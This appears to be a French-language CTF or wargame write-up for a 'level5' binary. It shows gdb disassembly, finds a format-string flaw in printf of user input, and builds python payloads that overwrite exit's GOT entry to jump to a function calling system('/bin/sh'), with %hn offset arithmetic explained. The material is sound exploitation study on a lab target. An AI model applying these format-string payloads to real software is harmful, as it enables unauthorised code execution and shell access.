Dump of assembler code for function main:
   0x08048504 <+0>:     push   %ebp
   0x08048505 <+1>:     mov    %esp,%ebp
   0x08048507 <+3>:     and    $0xfffffff0,%esp
   0x0804850a <+6>:     call   0x80484c2 <n>
   0x0804850f <+11>:    leave  
   0x08048510 <+12>:    ret   

Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>

Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp
   0x080484aa <+6>:     movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>


On a main qui call n()

Dans n() on a un gets et un printf 

On a une fonction o() qui call system("/bin/sh") mais qui n'est pas appele
Il va falloir trouver un moyen de call cette fonction pour executer system()

Donc a mon avis il va falloir ecraser l'adresse
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>

Pour remplacer par le call a la fonction o()
En utilisant gets et printf comme l'exercice precedent

Donc ecrire N bytes sur 0x080484ff ou N est egale a 0x080484a4 ???
Ou prendre l'adresse de la plt exit ?
o()  : 0x080484a4

On va essayer les deux, voyons voir

0xb7 e5 eb e0
r < <(python -c '"\xe0\xeb\xe5\xb7" + "\xe2\xeb\xe5\xb7" + "%2046" + "%4$hn" + "%31902" + "%5$hn"')


(gdb) x/2i 0x80483d0
   0x80483d0 <exit@plt>:        jmp    *0x8049838
   0x80483d6 <exit@plt+6>:      push   $0x28


0x80483d0 est l'adresse dans la PLT (Procedure Linkage Table)
Le jmp *0x8049838 indique que 0x8049838 est l'entrée dans la GOT pour exit
C'est donc cette adresse (0x8049838) qu'il faut réécrire avec l'adresse de la fonction o()
0x 08 04 98 38


r < <(python -c 'print "\x38\x98\x04\x08" + "%134513824c" + "%4$n"')
(python -c 'print "\x38\x98\x04\x08" + "%134513824c" + "%4$n"'; cat) | ./level5

x/x 0x8049838
    0x8049838 <exit@got.plt>:       0x080484a4

Ok ca marche mais essayons de d'ecrire 2x2 (short) bytes, bytes de poids faible et fort pour eviter d'ecrire autant sur la pile

(python -c 'print "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044d" + "%4$hn" + "%31904d" + "%5$hn"'; cat) | ./level5
Expliquons cette ligne :
Donc on commence par ecrire les deux adresses (a 2 bytes d'ecart) pour ecrire sur la partie haute et basse

Ensuite on va ecrire 0x0804 sur la premiere et 0x84a4 sur la deuxieme (pas exactement)
    0x0804 = d2052
    2052 - 8 = 2044 // On soustrait 8 pour les deux adresses

Ensuite on a :
    0x84a4 = d33956
    33956 - 8 - 2044 = 31904 // On soustrait 8 et les 2044 char